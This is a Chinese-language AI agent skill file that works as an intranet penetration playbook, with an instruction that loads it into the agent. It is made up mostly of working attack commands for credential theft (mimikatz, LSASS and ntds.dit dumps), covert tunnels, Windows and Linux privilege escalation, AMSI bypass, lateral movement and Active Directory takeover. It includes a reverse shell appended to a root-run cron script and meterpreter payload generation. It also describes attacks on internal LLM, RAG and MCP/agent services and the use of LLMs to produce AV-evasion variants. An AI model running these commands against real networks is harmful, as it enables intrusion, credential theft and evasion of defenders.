---
name: intranet-penetration-testing
description: 内网渗透测试深度专业技能：本地信息收集与凭证窃取(mimikatz/LSASS/ntds.dit)、内网探测与隐藏隧道(frp/Chisel/DNS/ICMP)、Windows/Linux提权、横向移动矩阵(IPC/WMI/DCOM/PSEXEC)、AD域渗透与域控接管(Zerologon/Kerberoast/ADCS)、权限维持与痕迹清除、免杀与C2、AI大模型内网攻击面(Ollama/vLLM/向量数据库/RAG/MCP/Agent)、AI辅助红队作战(路径分析/免杀增强/自动化)
metadata:
  version: 1.0.0
---

# 内网渗透测试深度技能

> **AI LOAD INSTRUCTION**: 内网渗透全链路专家打法。按已知前提：已获初始立足点。聚焦本地收集→凭据窃取→隧道→提权→横向→域渗透→维持的递进决策，域渗透细节由 active-directory-attack 细分包承接。维持/免杀类动作先过 authorized-attack-scope。

## 概述

内网渗透是攻防对抗的决胜战场——外网打点成功后，能否**从一台主机走向整个内网、直至域控接管**，取决于信息收集的深度、凭证获取的能力与攻击路径的规划。本技能以《安服内网渗透测试指南》为骨架，以**资深攻防专家视角**组织，覆盖**本地信息收集→凭证窃取→内网探测→隐藏隧道→权限提升→横向移动→AD域渗透→权限维持→痕迹清除→免杀C2**完整攻击链，并**结合AI大模型能力**补充两个前沿维度：**AI大模型系统本身的内网攻击面**（私有化LLM/Ollama/vLLM/向量数据库/RAG/MCP/Agent）与**AI辅助红队作战**（大模型驱动的信息分析、攻击路径规划、免杀增强与自动化）。

与`network-penetration-testing`技能（全流程攻击链概览）互补：本技能聚焦内网阶段的高频实操细节与当代高端对抗手法。

## 一、本地信息收集（打点后的第一站）

> 原则：**先本地后网络，先凭证后提权**。本地信息收集决定后续所有攻击路径的可行性，10分钟的系统化收集胜过盲目扫描。

### 1.1 网络/系统/软件/服务信息
```bat
ipconfig /all                                                      :: 网卡/网关/DNS(域判断关键)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"   :: OS版本与架构
echo %PROCESSOR_ARCHITECTURE%                                      :: 架构(影响payload选择)
wmic product get name,version                                      :: 安装软件清单(找可利用中间件)
wmic service list brief                                            :: 服务列表(找错误配置/第三方服务)
tasklist /svc                                                      :: 进程与服务关联(杀软/EDR/AV)
wmic startup get command,caption                                   :: 启动项(持久化线索/账密)
schtasks /query /fo LIST /v                                        :: 计划任务(常藏连接账号密码)
net session                                                        :: 本机与客户端的会话
netstat -anto                                                      :: 端口/连接(判断出网/服务)
```

### 1.2 用户与会话
```bat
net user                                                           :: 本机用户列表
net localgroup administrators                                      :: 本地管理员组(常含域用户)
query user                                                         :: 当前在线用户(RDP目标)
net user <username>                                                :: 用户详情(上次登录时间等)
whoami /all                                                        :: 当前权限与令牌信息(提权线索)
wmic useraccount get name,sid,disabled                             :: SID与禁用状态
```

### 1.3 补丁/防火墙/共享/路由
```bat
wmic qfe get Caption,HotFixID,InstalledOn                          :: 补丁列表(缺哪补丁→对应漏洞)
netsh advfirewall show allprofiles                                 :: 防火墙状态与规则
net share                                                          :: 本机共享(敏感共享泄露)
wmic share get name,path,status                                    :: 共享列表
route print                                                        :: 路由表(发现其他网段)
arp -a                                                             :: ARP缓存(活跃主机/网关)
```
> **高级**：`arp -a` 与 `route print` 是发现**新网段**的第一手情报——内网多网段边界机往往是跳板机的首选。

### 1.4 历史命令与登录记录
```bash
# Windows
# 每个用户的 .bash_history 类似物——PowerShell历史
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Linux（含大量敏感账号密码/IP/服务配置）
history
cat ~/.bash_history
grep -iE "pass|pwd|ssh|mysql|redis|token|secret" ~/.bash_history
```
**RDP/SSH 外连记录定位运维人员**：
```
# Windows RDP外连记录（快速定位运维/管理员主机）
cmdkey /list                                     # 保存的凭据(可离线解密)
# SharpEventLog: 读取本机所有登录本机的计算机记录
# 位置: 注册表 HKCU\Software\Microsoft\Terminal Server Client\Servers
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

# Linux SSH
cat ~/.ssh/authorized_keys                      # 谁曾免密登录过
cat ~/.ssh/id_rsa*                              # 私钥(可复用登录其他主机)
lastlog && last -a                              # 登录IP历史
cat ~/.ssh/config /etc/ssh/ssh_config           # 配置中的跳板/账号
```

### 1.5 杀软/EDR识别（决定免杀策略）
```
# 直接看进程
tasklist | findstr /i "360 kav avp mcshield egui safedog hws hipstray MsMpEng
  Norton symantec cccen NISUN x64 sysdiag 火绒 安天 深信服 奇安信 天擎
  QAX 微步 青藤 ossec alibaba aegis"
# 服务
wmic service get name,displayname,pathname | findstr /i "360 kav aegis"
# 驱动
driverquery /v | findstr /i "360 qutmips ysprotect sysdiag"
# PowerShell AMSI/CLM 状态
Get-MpComputerStatus 2>$null | Select RealTimeProtectionEnabled
```
> **决策链**：识别杀软 → 判断有无EDR（是否有内核驱动/行为分析）→ 决定免杀强度与上线方式（进程注入/无文件/白利用）。

### 1.6 AI辅助信息收集分析
```
# 大模型快速处理原始输出：把 ipconfig/systeminfo/tasklist/wmic 输出丢给LLM，
# 让其标注: 1)可疑的高权限进程 2)可利用的第三方软件 3)缺失的关键补丁
# 4)网段关系图 5)杀软与免杀建议。省去人工逐行翻找的耗时。
# 典型提问示例（见第十三章AI辅助红队作战）：
#  "分析以下 systeminfo 输出，列出可能存在的提权漏洞（给出CVE编号）"
#  "从这份 tasklist 中识别出所有安全软件及其类型(AV/EDR/HIPS)"
```

## 二、凭证窃取（密码是内网通行证）

> 内网渗透本质是**凭证的收集与复用**。一次抓取的明文密码/哈希可用于密码喷洒、撞库、PTH 与横向移动，价值远超单个系统权限。

### 2.1 Windows凭证窃取（mimikatz系列）
```
# 管理员/SYSTEM权限，先提权
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords          # 抓LSASS中登录凭据(明文+NTLM)

# Win10/2012R2+默认不存明文，开启WDigest后重启/重登可抓明文
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
**LSASS 提取（mimikatz被拦时）**：
```
# Procdump（微软官方签名，白利用）
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# comsvcs.dll（lolbin，无文件落地）
tasklist | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> dump.bin full
# 本地离线解析
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```
**注册表离线转储（无需内存操作）**：
```
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
# 离线用 mimikatz lsadump::sam /sam:sam.hiv /system:system.hiv 解密本机hash
```
**域控ntds.dit（一次获取全域hash）**：
```
# ntdsutil 快照
ntdsutil snapshot "active instance ntds" create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy C:\$SNAP_xxx\windows\ntds\ntds.dit c:\temp\ntds.dit
# vssadmin 卷影
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds.dit
# 离线解析（配合 SYSTEM hiv 解密hash）
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```
**绕过LSASS防护（LSA Protection/PPL）**：
```
# PPLdump（签名工具绕过PPL）
PPLdump64.exe <lsass_pid> lsass.dmp
# mimikatz + mimidriver 卸载PPL保护
mimikatz "!+" "!processprotect /process:lsass.exe /remove" privilege::debug sekurlsa::logonpasswords
# NanoDump: 免杀dump lsass(绕过AV)
nanodump.exe --write /tmp/lsass.dmp
```

### 2.2 Linux凭证窃取
```
# 内存明文（需root）
./mimipenguin                                                      # Kali/Ubuntu等
# shadow破解
unshadow /etc/passwd /etc/shadow > hash.txt && john hash.txt
# 环境变量/进程参数（常含密钥）
for p in /proc/[0-9]*/environ; do strings $p 2>/dev/null | grep -iE "pass|key|secret"; done
# 全盘搜索敏感信息
grep -rn "password=" /etc /home /root /var/www /opt 2>/dev/null
find / -iname "*.conf" -o -iname "*.properties" -o -iname "*.ini" 2>/dev/null | xargs grep -ilE "pass|secret|token"
```

### 2.3 常见软件/中间件凭证（一次性批量提取）
```
# 桌面软件凭据: Navicat/TeamViewer/FileZilla/WinSCP/Xshell/Xftp
SharpDecryptPwd.exe                                          # uknowsec
# 浏览器密码/Cookie/历史
HackBrowserData.exe                                          # moonD4rk(全平台)
BrowserGhost.exe /laZagne all                                # 奇安信QAX / LaZagne
SharpChromium.exe                                            # Cookie+登录凭据
mimikatz dpapi::chrome /in:"%localappdata%\...\Login Data" /unprotect
# WiFi密码
SharpWifiGrabber.exe / netsh wlan show profiles <name> key=clear
# 向日葵(内网远控高发)
Sunflower_get_Password.exe                                   # 识别码+验证码
# MSSQL各版本密码Hash
select name,password_hash from sys.sql_logins                # 2008R2+
select name,password from master.dbo.sysxlogins              # 2000
# Oracle/MySQL/Redis等弱口令+库内密码表(为撞库铺垫)
```

### 2.4 配置文件与数据库密文解密
```
# 中间件/应用配置(内网常见)
# Tomcat:      WEB-INF/classes/{db,jdbc,config,application}.properties + conf/tomcat-users.xml
# WebLogic:    Decrypt_Weblogic_Password(密文AES解密)
# 致远OA:      /opt/Seeyon/A8/base/conf/datasourceCtp.properties
# 用友NC:      /nchome/ierp/bin/prop.xml (ncDecode)
# 泛微OA:      D:\WEAVER\ecology\WEB-INF\prop\weaver.properties
# ActiveMQ:    /apache-activemq/conf/jetty-realm.properties
# 批量搜索明文敏感信息(Windows)
findstr /i /s /m "password" *.config *.ini *.xml *.properties *.yml *.yaml
# 搜索常见密钥文件
findstr /i /s /m "BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY" C:\*
```

### 2.5 云凭证
```
# SharpCloud: 检查 AWS/Azure/GCP 本地凭证文件
SharpCloud.exe
# 云元数据(若存在SSRF或本机可访问169.254.169.254)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
curl http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01  # Azure
# 云CLI配置
type %USERPROFILE%\.aws\credentials   ;  cat ~/.aws/credentials
# 容器/K8s：ServiceAccount Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 2.6 凭证利用优先级（决策链）
```
1. 明文密码 > NTLM哈希 > Kerberos票据 > 会话令牌
2. 抓到密码后立即做: 密码喷洒(低频) → 撞库(内网所有资产) → PTH(同口令复用)
3. 优先尝试: 域管/Domain Admin组 → 本地管理员组 → 运维账号(sa/root/administrator)
4. 工具: crackmapexec(密码喷洒) / fscan -m <protocol> -pwd <dict> / Hydra
```

## 三、内网网络信息收集

### 3.1 存活主机探测
```bat
:: 内置命令(不出网/无工具环境)
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
:: NetBIOS(可拿到主机名/用户名/MAC)
nbtscan.exe 192.168.1.0/24
:: ARP扫描(本机同网段,快且不易被发现)
arp-scan -l / Invoke-ARPScan.ps1 -CIDR 192.168.1.0/20
:: nmap存活探测(大并发)
nmap -sP --min-hostgroup 1024 --min-parallelism 1024 -iL ip.txt -oG alive.txt
:: UDP关键口(53/137/161)扫存活
nmap -sU -p 53,137,161 192.168.1.0/24
```

### 3.2 端口扫描与服务识别
```bash
# 全端口快速(通过代理)
proxychains nmap -sT -Pn -p- --min-rate 2000 10.10.10.0/24 -oN full.txt
# 关键端口定向
nmap -sT -Pn -p 21,22,23,53,80,135,139,445,443,1433,1521,3306,3389,
  5432,5900,6379,7001,8080,8443,9200,11211,2181,27017,5000,11434,19530 10.10.10.0/24
# 服务指纹
nmap -sT -Pn -sV -p 445,1433,3306,6379 10.10.10.10
# UDP服务(SNMP/Syslog等)
nmap -sU -sV -p 53,161,137,139,500,1617,1900 10.10.10.10
```

### 3.3 常见端口高危服务速查（内网横向重点）
| 端口 | 服务 | 攻击面 |
|------|------|--------|
| 445/139 | SMB | MS17-010/SMBGhost、弱口令、未授权共享、PTH |
| 3389 | RDP | 弱口令、BlueKeep(CVE-2019-0708)、NLA绕过 |
| 22 | SSH | 弱口令、私钥复用、隧道代理 |
| 1433 | MSSQL | sa弱口令、xp_cmdshell提权、链接服务器 |
| 3306 | MySQL | 弱口令、UDF提权、未授权 |
| 6379 | Redis | 未授权RCE(写公钥/计划任务/主从复制) |
| 27017 | MongoDB | 未授权访问 |
| 9200 | Elasticsearch | 未授权、RCE(CVE-2015-1427) |
| 11211 | Memcached | 未授权、DRDoS反射 |
| 2181 | ZooKeeper | 未授权访问(配置/会话泄露) |
| 7001/7002 | WebLogic | 反序列化(T3/IIOP)、弱口令 |
| 8080/8089 | Tomcat/JBoss/Jenkins | 弱口令、反序列化、后台部署 |
| 1099 | Java RMI | 反序列化 |
| 873 | Rsync | 匿名访问、文件读取 |
| 50000 | SAP | 远程代码执行 |
| 8069 | Zabbix | 弱口令、监控命令执行 |
| 2181/9092 | Kafka | 未授权、消息窃取 |
| **11434** | **Ollama** | **LLM服务未授权（见12.1）** |
| **19530/8000** | **向量库/推理服务** | **AI服务未授权（见12.1/12.2）** |

### 3.4 综合扫描工具（内网渗透标配）
```bash
# fscan（最常用：存活+端口+弱口令+Web漏洞+MS17-010一站式）
fscan.exe -h 10.10.10.0/24                          # 全模块
fscan.exe -h 10.10.10.0/24 -nobr -nopoc             # 静默模式(减少流量)
fscan.exe -h 10.10.10.0/24 -m smb -pwd password     # 指定模块/密码碰撞
fscan.exe -h 10.10.10.0/24 -rf id_rsa.pub           # redis写公钥
fscan.exe -hf ip.txt -o result.txt                  # 批量导入+结果输出
# LadonGo（一键C/B/A段：存活/指纹/爆破/高危漏洞/远程执行）
Ladon 10.10.10.8/24 MS17010 ; Ladon 10.10.10.8/24 PortScan
# netspy（网段发现,适合大内网横向扩张）
netspy is                       # icmp全自动探测 10/172.16/192.168 段
netspy ts -p 22 -p 3389         # tcp探测
# Yasso（红队辅助工具集,含代理与并发）
Yasso.exe all -H 10.10.10.1/24
```

### 3.5 网段发现与扩张（高级）
```
# 网段来源：路由表、ARP缓存、DHCP分配、DNS记录(domain controllers)、
# 服务器多网卡、云VPC网段、容器网络(172.17.0.x/10.244.x.x)
# 多网段主机 = 跳板机首选
# 大内网：按 网关存活→B段/C段 逐层推进,先打管理网段(运维/堡垒机/监控)再打业务网段
# AI辅助：把路由表/ARP/探测结果给LLM生成网段拓扑图与推进顺序建议
```

## 四、隐藏通信隧道

### 4.1 连通性判断
```bash
# 分别测试各协议出网(内网边界/防火墙策略)
ping 8.8.8.8                       # ICMP
curl -x http://<vps>:8080 http://example.com   # HTTP(S)代理出网
nslookup <dnslog>.dnslog.cn <vps_ip>           # DNS出网(仅53)
nc -vz <vps> 53 ; nc -vz <vps> 443             # TCP端口出网
# 判断进网：能否被外网直接访问(映射/公网IP/云负载均衡)
```
> 出网方式直接决定隧道选型：`能直连外网→frp/EW`、`仅HTTP(S)→reGeorg/Chisel`、`仅DNS→dnscat2/iodine`、`仅ICMP→icmpsh/ptunnel`。

### 4.2 隧道工具矩阵
| 工具 | 场景 | 特征 |
|------|------|------|
| frp | 通用TCP/SOCKS代理,稳定 | 特征明显,需混淆/加壳 |
| Chisel | 单二进制,HTTP/WS封装,穿透性强 | 建议over WSS |
| Neo-reGeorg | WebShell环境(php/jsp/aspx) | 流量走HTTP隧道 |
| nps/pystinger | 多级代理/EDR环境(毒刺免杀好) | 支持内网级联 |
| EarthWorm(EW) | 老牌正向/反向/多级代理 | 静态特征多,慎用 |
| Venom | 多级代理+端口转发 | 模块化 |
| lcx | 端口转发(3389映射出网) | 明文,易被查杀 |
| SSH | -L/-R/-D 本地/远程/动态转发 | 有SSH入口首选 |
| netsh portproxy | Windows自带端口转发 | 无文件落地 |
| icmpsh/ptunnel | ICMP隧道 | 严格防火墙下保底 |
| dnscat2/iodine | DNS隧道 | 仅DNS出网 |

### 4.3 代理搭建实战
```bash
# frp SOCKS5
# frps.ini(服务端VPS)
[common]
bind_port = 7000
token = s3cr3t
# frpc.ini(内网主机)
[common]
server_addr = <vps>
server_port = 7000
token = s3cr3t
[socks5]
type = tcp
remote_port = 6000
plugin = socks5
# 本地使用
proxychains nmap -sT -Pn 10.10.10.0/24

# Chisel 反向代理(单文件,静态二进制,配合TLS混淆)
chisel server -p 8080 --reverse                # VPS
chisel client wss://<vps>:8080 R:socks         # 内网主机(WS封装过WAF)

# Neo-reGeorg(WebShell场景)
python neoreg.py generate -k password          # 生成隧道脚本上传
python neoreg.py -k password -u http://target/tunnel.jsp -l 127.0.0.1 -p 1080

# SSH动态转发(有SSH权限时最优雅)
ssh -CfNg -D 1080 user@target
```

### 4.4 内网级联代理（多跳）
```
# 场景: A(边界) → B(核心网) → C(隔离网)
# 级联方式: B上跑二级frps → 本地proxychains链到B → B上proxychains链到C
# 或 pystinger/nps 支持的内网级联: agent→proxy→二级agent
# 工具链: frp多级 / nps / pystinger / ssh ProxyJump(-J)
ssh -J userA@A,userB@B userC@C -D 1080        # SSH JumpHost级联
```

### 4.5 隧道检测规避（攻防对抗视角）
```
- 尽量使用标准协议封装: WSS(Chisel)/DNS(iodine)/ICMP(icmpsh)
- 低频率小流量: 避开流量监控的"突发隧道"特征
- 端口复用: 走已开放的80/443/53端口
- 域前置/DNS over HTTPS 规避内容检测
- 定期轮换端口与证书,避免长期固定特征
- 避免使用已知静态签名的老工具(EW/lcx/cobaltstrike默认特征)
```

## 五、Windows权限提升

### 5.1 BypassUAC
```
# 场景: 本地管理员账号但UAC限制(高权限命令被拦)
# 手法: IFileOperation COM / eventvwr.exe注册表劫持 / sdclt.exe /
#       SilentCleanup(磁盘清理任务) / cmstp.exe / 环境变量劫持高权限.NET程序
# 工具: UACME(Akagi64) / SharpBypassUAC / Bypass-UAC(FuzzySecurity)
UACME\Akagi64.exe 23                                # 常用UAC绕过payload编号
```

### 5.2 内核漏洞提权
```
# 依据systeminfo补丁列表 → 匹配未修补CVE
# 常用: CVE-2020-1472(Zerologon,域控) / CVE-2021-21551(dell驱动) /
#       PrintNightmare CVE-2021-34527(打印服务) / CVE-2022-21999(SpoolFool)
# 工具集: Kernelhub / Windows-Exploits / windows-exploit-suggester
python windows-exploit-suggester.py -d 2021-01-01-db -i systeminfo.txt
```

### 5.3 服务与数据库提权
```
# 数据库提权(内网高发)
# MSSQL: sa弱口令 → xp_cmdshell / CLR / 代理作业
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
# MySQL: UDF提权(需写权限+plugin目录) / 日志getshell / 弱口令
# Oracle: oracleShell / JavaSource(高权限DBMS_JAVA)
# 工具: SharpSQLTools / MDUT / Sylas
# 服务配置提权
# 可写服务路径 → 替换服务二进制/放恶意DLL
wmic service get name,pathname | findstr /i "c:\\program files"
# 未引号服务路径
wmic service get name,pathname | findstr /v "C:\\Windows\\system32" | findstr /v /i "c:\\program"
# 可写注册表服务键 / 可写文件路径服务
```

### 5.4 错误配置提权
```
# 可写文件/文件夹 + SYSTEM运行的服务
icacls "C:\Program Files\xxx"                # Everyone:(F) 等
# 计划任务可写脚本
schtasks /query /fo LIST /v | findstr /i "task run as"
# 任意用户以SYSTEM安装MSI(AlwaysInstallElevated)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/meterpreter/reverse_tcp -f msi -o evil.msi
# 服务令牌提升 SeImpersonatePrivilege(见5.5)
```

### 5.5 Potato家族提权（SeImpersonatePrivilege）
```
# whoami /priv 查看: SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege → Potato
# Windows Server 2016/2019 + 高版本: PrintSpoofer / GodPotato / EfsPotato / SweetPotato
# (RottenPotato/JuicyPotato已不适用于新系统)
PrintSpoofer.exe -i -c cmd.exe
GodPotato -cmd "cmd /c whoami"
# 域控提权漏洞(CVE): noPac(CVE-2021-42278/42287) / Zerologon(CVE-2020-1472) 见第八章
```

### 5.6 提权自动化与AI辅助
```
# 自动枚举: WinPEAS / PowerUp / PrivescCheck / BeRoot
winpeas.exe quiet
. .\PowerUp.ps1; Invoke-AllChecks
# AI辅助: 把WinPEAS输出粘贴给LLM → 让它按可利用性排序并给出利用链
```

## 六、Linux权限提升

### 6.1 内核提权
```
uname -a && cat /etc/os-release
# 常见: CVE-2021-4034(Polkit pkexec,通杀) / CVE-2021-3156(sudo Baron Samedit) /
#       CVE-2022-0847(Dirty Pipe) / CVE-2023-4911(GLIBC Looney Tunables) /
#       CVE-2024-1086(nf_tables UAF)
# 工具: linux-exploit-suggester(les.sh) / linux-smart-enumeration(lse.sh)
./les.sh
```

### 6.2 SUID/计划任务/Cron
```bash
find / -perm -4000 -type f 2>/dev/null                     # SUID(gtfobins核对)
find / -perm -2000 -type f 2>/dev/null                     # SGID
ls -alh /var/spool/cron* /etc/cron* /etc/crontab           # 可写Cron脚本→命令注入
cat /etc/cron.d/* /etc/at.allow /etc/at.deny
# 可写脚本被root执行 → 反弹shell
echo 'bash -i >& /dev/tcp/<vps>/4444 0>&1' >> /usr/local/bin/backup.sh
```

### 6.3 错误配置与明文凭证
```bash
# 可写敏感文件 / 弱权限服务配置
cat /etc/passwd | grep -v nologin                          # 可登录用户
sudo -l                                                    # 当前sudo权限
ls -la /etc/shadow /etc/sudoers                            # 弱权限
grep -rE "password|passwd|secret" /home /var/www /opt /etc/init.d 2>/dev/null
# Docker组 / 特权容器 / K8s SA(见container-security-testing技能)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh         # docker组提权
```

## 七、横向移动矩阵

### 7.1 内网脆弱面（横向第一波）
```
# 顺序: 弱口令爆破 → 未授权访问 → 中间件RCE → MS17-010 → 密码撞库
# 弱口令: SSH/RDP/MSSQL/MySQL/Redis/Oracle/VNC/SMB/PostgreSQL
# 未授权: Redis / MongoDB / Elasticsearch / Memcached / ZooKeeper / Kafka / Hadoop YARN
# 中间件RCE: WebLogic(T3/IIOP) / JBoss / Tomcat部署 / Jenkins / ActiveMQ
# 批量自动化: fscan -nobr -nopoc 快速摸底, 再对结果定点利用
# 撞库: 用已获取的密码库批量碰撞所有资产(同口令复用率极高)
```

### 7.2 Windows远程执行技术（横向核心）
```
# IPC$ 建立连接
net use \\10.10.10.10\ipc$ "password" /user:domain\user
# 计划任务执行(老系统)
copy mu.exe \\10.10.10.10\C$ ; at \\10.10.10.10 15:15 C:\mu.exe
# schtasks(新系统)
schtasks /create /s 10.10.10.10 /tn test /sc onstart /tr c:\mu.exe /ru system /f
schtasks /run /s 10.10.10.10 /i /tn test
# PSEXEC(释放psexesvc服务,特征明显)
psexec \\10.10.10.10 -accepteula -u user -p pass cmd.exe
# impacket-psexec / smbexec (Python版,服务名可自定义混淆)
python3 psexec.py domain/user:pass@10.10.10.10
python3 smbexec.py domain/user:pass@10.10.10.10 -service-name 5A1n6
# WMI(无回显,配合IPC写文件读结果)
wmic /node:10.10.10.10 /user:admin /password:pass process call create "cmd.exe /c ipconfig > ip.txt"
wmiexec.py domain/user:pass@10.10.10.10
# DCOM(免上传文件)
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null," /c calc.exe","")
# WinRM(5985/5986,走HTTP)
evil-winrm -i 10.10.10.10 -u user -p pass
# 哈希传递PTH(拿到NTLM后无需明文)
crackmapexec smb 10.10.10.0/24 -u admin -H <ntlm_hash> --exec-method smbexec -x whoami
psexec.py -hashes :<ntlm_hash> domain/admin@10.10.10.10
```

### 7.3 Bypass AMSI
```
# 场景: PowerShell被AMSI拦截 → 横向脚本无法执行
# 1) 降级PS2.0(老系统)
powershell -version 2 -nop -c "IEX (...)"
# 2) 内存Patch AmsiScanBuffer(常见bypass脚本)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 3) 注册表禁用(高权限)
Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\Script\Settings -Name AmsiEnable -Value 0
# 4) 反射加载绕过(流量混淆+内存Patch), 工具: AMSI.fail在线生成变体
# AI辅助: 让LLM生成多种AMSI bypass变体用于AV/EDR测试(见11.3)
```

### 7.4 利用运维通道（高价值横向）
```
# 补丁服务器/软件分发: 投递恶意更新包或替换安装源
# EDR主控端: 若攻陷EDR管理端 → 全内网定向下发执行(隐蔽且高权限)
# 堡垒机: 堡垒机失守 = 全内网运维通道沦陷(需先拿堡垒机密码库)
# 跳板机/运维终端: 常保存大量运维账号与免密通道
# 监控平台(Zabbix/Prometheus/Grafana): 命令执行/配置注入
# 虚拟化平台(vCenter/ESXi/Proxmox/K8s): 见7.5
# 注意: 上述路径动静极大,先评估攻击噪音再决策
```

### 7.5 虚拟化/监控/邮件平台后渗透
```
# vCenter(拿到root后):
# 1) 从 data.mdb 提取IdP证书伪造SAML管理员cookie
#    (Linux: /storage/db/vmware-vmdir/data.mdb ; Win: C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb)
#    vcenter_ExtraCertFromMdb.py → vcenter_GenerateLoginCookie.py
# 2) 通过快照/虚拟机内存取证dump凭证 → PTH
# 3) CVE-2021-21972/21985等未授权RCE
# Zabbix: 弱口令 → 监控项命令执行(Server权限)
# Exchange: ProxyLogon(2021-26855)/ProxyShell链/Exchange2domain/NtlmRelayToEWS(横向至域管)
#   → 可读邮箱、重置域用户密码、滥用Exchange写ACL
```

### 7.6 AI大模型平台横向（新战场）
```
# 内网AI平台往往集中部署 GPU 算力 + 敏感训练/推理数据,攻击价值极高:
# 1) 未授权LLM服务(Ollama/vLLM/LM Studio) → 直接调用推理/拉模型(见12.1)
# 2) 向量数据库未授权 → 全量导出RAG知识库(内部文档/源码/凭证)(见12.2)
# 3) AI平台后台弱口令(Dify/FastGPT/Langflow/MaxKB) → 管理所有知识库与模型
# 4) MCP/Agent服务暴露 → 工具调用滥用(文件/数据库/内网HTTP)(见12.3)
# 5) 模型文件本身: 从存储/备份拉取权重与微调数据
```

## 八、AD域渗透

### 8.1 域信息收集
```bat
ipconfig /all                                   :: 主DNS后缀=域名
nslookup <domain>                               :: 与DNS同IP即域控
net time /domain                                :: 存在域则返回域控名
net view /domain                                :: 域列表
net view /domain:XXX                            :: 域内计算机
net group "domain controllers" /domain          :: 域控列表
net user /domain                                :: 域用户列表
net localgroup administrators                   :: 本地管理员组(含域账号)
wmic useraccount get /all                       :: 域用户详情
dsquery user -limit 0                           :: 全量用户
nltest /DCLIST:XXX                              :: 域控机器名
```
**高级枚举（BloodHound 数据采集）**：
```powershell
# SharpHound 采集(全量关系图)
SharpHound.exe -c All --zipfilename bh.zip
# 分析: 导入BloodHound → 查找 "Shortest Path to Domain Admins"
# AI辅助: 把SharpHound结果/cypher查询结果给LLM解释攻击路径(见13.1)
```

### 8.2 获取域控方法（攻击路径优先级）
| 方法 | 原理 | 工具 |
|------|------|------|
| DCSync | 域管/复制权限 → 拉取全域hash | mimikatz lsadump::dcsync / impacket secretsdump |
| Zerologon(CVE-2020-1472) | 重置域控机器密码 → 直接接管 | mimikatz/impacket |
| noPac(CVE-2021-42278/42287) | SAM-Account-Name混淆 → 域管票据 | noPac.py / sam-the-admin |
| Kerberoast | 服务账户SPN票证离线破解 | GetUserSPNs + hashcat -m 13100 |
| AS-REP Roasting | 无预认证用户离线破解 | GetNPUsers.py + hashcat -m 18200 |
| GPP(组策略偏好) | SYSVOL中cpassword AES可解 | gpp-decrypt |
| 委派滥用 | 无约束/约束/资源委派 | Rubeus / impacket |
| SSP截获 | 域控上注入SSP抓明文 | mimikatz misc::memssp |
| 票据投递PTT | 域管票据注入 | Rubeus ptt / mimikatz kerberos::ptt |
| Exchange ACL | 高权限组写ACL(WriteDacl) | Exchange ADSync / PrivExchange |

### 8.3 Kerberos高级攻击
```
# Kerberoasting(服务账户爆破)
python3 GetUserSPNs.py -request domain/user:pass -outputfile hash.txt
hashcat -m 13100 hash.txt wordlist.txt
# AS-REP Roasting(不需要密码)
python3 GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
# 委派滥用(约束委派→域管)
python3 findDelegation.py domain/user:pass
python3 getST.py -spn cifs/DC.domain domain/user:pass -impersonate administrator -dc-ip <DC>
python3 wmiexec.py -k -no-pass domain/administrator@DC.domain
# 黄金票据(需要krbtgt hash,伪造任意用户)
mimikatz "kerberos::golden /user:administrator /domain:xxx /sid:xxx /krbtgt:<hash> /ptt"
# 白银票据(服务票据伪造,免接触KDC)
mimikatz "kerberos::golden /user:xxx /service:cifs /target:DC /rc4:<hash> /ptt"
# 票据传递PTT
Rubeus.exe ptt /ticket:<base64>
```

### 8.4 ADCS/ACL/GPO滥用（当代主流）
```
# ADCS(证书服务) ESC1-ESC8: 配置不当CA签发高权限证书
certipy find -u user@domain -p pass -dc-ip <DC> -vulnerable
# ESC1: 用户可请求任意SAN证书 → 冒充域管
certipy req -u user@domain -p pass -ca CA-NAME -target <CA> -template ESC1 -upn administrator@domain
certipy auth -pfx admin.pfx -dc-ip <DC>
# ACL滥用: GenericAll/WriteDacl/ForceChangePassword → 提权/接管
bloodyAD -d domain -u user -p pass add genericAll user2:target
python3 dacledit.py -action write -rights GenericAll -principal user -target 'Domain Admins' domain/user:pass
# GPO滥用: 创建/修改GPO → 下发计划任务/脚本全域执行
# (需具有GPO编辑权限,SharpGPOAbuse)
